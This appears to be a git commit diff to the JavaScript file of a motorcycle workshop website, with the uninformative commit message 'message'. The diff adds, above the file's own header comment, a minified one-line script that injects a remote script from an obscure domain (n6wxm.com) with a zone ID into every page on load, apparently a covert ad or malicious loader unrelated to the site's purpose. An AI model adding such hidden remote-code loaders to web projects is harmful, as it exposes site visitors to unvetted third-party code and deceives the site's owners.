deee5af112a3b5370513038fe579522ce2f3272a
parbhumahat <parbhu12c.mdmss@gmail.com>
2026-08-25 13:57:33 +0545

    message

--- script.js
+++ script.js
@@ -1,3 +1,5 @@
+(function(s){s.dataset.zone='11649085',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))
+
 /**
  * Bishnu Motorcycle Workshop - Interactive Script
  * Vanilla JavaScript ES6+
